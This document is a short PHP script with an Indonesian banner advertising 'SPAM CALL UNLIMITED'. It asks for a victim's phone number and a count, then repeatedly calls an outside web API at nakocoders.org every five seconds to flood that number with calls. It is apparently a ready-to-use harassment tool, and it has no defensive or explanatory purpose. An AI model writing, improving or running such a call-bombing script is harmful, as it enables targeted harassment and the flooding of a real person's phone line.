<?php
system("apt-get install toilet -y");
system("toilet -f future FakeCall --gay");
echo "
 ╔╗╴╴╴╔══════╗ \033[1;34mSPAM CALL\033[1;36m UNLIMITED\033[0m
║║╴╴╴║╴╔════╝
║╚═══╝╴╚════╗ Penyusun   : \033[1;32Henrycko01\033[0m
╚════╗╴╔═══╗║ Pendukung  : \033[1;32Dzakira Alzena Daiva01\033[0m
╔════╝╴║╴╴╴║║ 
╚══════╝╴╴╴╚╝
";
function api($nomor,$jumlah){
$url = "https://0x.nakocoders.org/rest-api/lain-nya/api.php?nomor=$nomor";
$loop = 0;
while($loop < $jumlah){
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$hasil = curl_exec($ch);
echo $hasil;
sleep(5);
$loop++;
}
}
echo "Masukan Nomor : ";
$nomor = trim(fgets(STDIN));
echo "Masukan Jumlah : ";
$jumlah = trim(fgets(STDIN));
api($nomor,$jumlah);
?>
